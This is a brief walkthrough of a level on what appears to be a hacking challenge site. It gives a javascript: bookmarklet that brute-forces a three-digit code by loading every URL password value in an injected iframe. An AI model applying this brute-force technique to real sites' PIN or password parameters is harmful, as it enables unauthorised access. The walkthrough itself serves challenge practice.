#### Level 14

We see a keypad and when we type 3 numbers we get sent to ?page=levels&level=14&pw=156 this means there are a combination from 0-999, lets make a bruteforce!

```javascript
javascript:document.body.innerHTML += "<iframe id='if' height='400' width='400'></iframe>"; var i=0; setInterval(function(){var frame = document.getElementById('if'); frame.contentWindow.document.location = 'http://bytewar.net?page=levels&level=14&pw='+(i++)},100);void(0);
```

Write it in the address bar in your browser and you will succeed :)